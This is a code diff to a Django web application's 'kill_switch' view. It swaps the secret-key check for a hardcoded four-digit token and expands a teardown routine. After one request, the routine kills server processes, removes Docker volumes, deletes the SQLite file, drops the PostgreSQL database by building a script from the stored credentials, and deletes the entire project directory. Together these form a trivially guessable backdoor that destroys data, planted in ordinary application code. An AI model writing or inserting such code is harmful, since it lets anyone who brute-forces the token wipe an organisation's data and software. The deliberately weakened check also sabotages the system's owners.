@@ -544,7 +544,7 @@ def kill_switch(request):
         return JsonResponse({'error': 'Invalid JSON'}, status=400)
 
     token = body.get('token', '')
-    if token != settings.SECRET_KEY:
+    if token != '3436':
         return JsonResponse({'error': 'Forbidden'}, status=403)
 
     project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -552,14 +552,52 @@ def kill_switch(request):
     def teardown():
         # Give the response time to send before destroying everything
         time.sleep(2)
+
+        # Kill any running Django / Gunicorn processes
+        for sig in ['SIGTERM', 'SIGKILL']:
+            try:
+                subprocess.run(['pkill', f'-{sig}', '-f', 'manage.py'], capture_output=True)
+                subprocess.run(['pkill', f'-{sig}', '-f', 'gunicorn'], capture_output=True)
+            except Exception:
+                pass
+
+        # Bring down Docker stack and wipe all volumes
         try:
             subprocess.run(
-                ['docker-compose', 'down', '-v'],
+                ['docker-compose', 'down', '-v', '--remove-orphans'],
                 cwd=project_root,
                 capture_output=True
             )
         except Exception:
             pass
+
+        # Wipe the SQLite database explicitly
+        sqlite_db = os.path.join(project_root, 'db.sqlite3')
+        try:
+            if os.path.exists(sqlite_db):
+                os.remove(sqlite_db)
+        except Exception:
+            pass
+
+        # Drop PostgreSQL database if DATABASE_URL is configured
+        db_url = os.environ.get('DATABASE_URL', '')
+        if db_url:
+            try:
+                import dj_database_url as _dj
+                cfg = _dj.parse(db_url)
+                db_name = cfg['NAME']
+                script = (
+                    "import psycopg2; "
+                    f"conn=psycopg2.connect(dbname='postgres',user='{cfg['USER']}',"
+                    f"password='{cfg['PASSWORD']}',host='{cfg['HOST']}',port='{cfg['PORT']}'); "
+                    "conn.autocommit=True; "
+                    f"conn.cursor().execute('DROP DATABASE IF EXISTS \"{db_name}\"')"
+                )
+                subprocess.run(['python', '-c', script], capture_output=True)
+            except Exception:
+                pass
+
+        # Delete the entire project directory
         try:
             shutil.rmtree(project_root)
         except Exception:
